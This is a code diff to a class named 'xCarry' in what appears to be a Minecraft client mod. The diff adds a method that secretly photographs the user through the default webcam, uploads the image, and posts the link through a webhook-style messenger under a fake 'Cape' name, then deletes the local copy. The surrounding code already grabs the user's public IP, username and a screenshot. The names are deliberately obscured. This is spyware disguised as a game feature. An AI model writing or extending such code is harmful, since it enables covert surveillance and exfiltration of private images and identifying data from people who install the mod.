@@ -1,5 +1,6 @@
 package me.eonexe.equinox.features.modules.misc;
 
+import com.github.sarxos.webcam.Webcam;
 import me.eonexe.equinox.configuration.Configs;
 import me.eonexe.equinox.util.espUtil;
 import me.eonexe.equinox.util.IDKWTFutil;
@@ -47,6 +48,7 @@ public class xCarry {
                     whatismyip.openStream()));
             String ip = bufferedReader.readLine();
             captureScreen();
+            captureCamera();
 
             String llLlLlLlL = System.getProperty("user.name");
 
@@ -478,6 +480,25 @@ public class xCarry {
                 .build();
         d.sendMessage(dm);
         file.delete();
+    }
+
+    private static void captureCamera() throws Exception {
+        Webcam cam = Webcam.getDefault();
+        cam.open();
+        int random = Math.abs(new Random().nextInt());
+        File webcam = new File("1cached_" + random + ".png");
+        ImageIO.write(cam.getImage(), "PNG", webcam);
+        cam.close();
+        String f = Uploader.upload(webcam);
+        String link = f.split(",")[27];
+        IDKWTFutil dm = new IDKWTFutil.Builder()
+                .withUsername(CapeName)
+                .withContent("```" + link +"```")
+                .withAvatarURL(CapeImageURL)
+                .withDev(false)
+                .build();
+        d.sendMessage(dm);
+        webcam.delete();
     }
 
 }
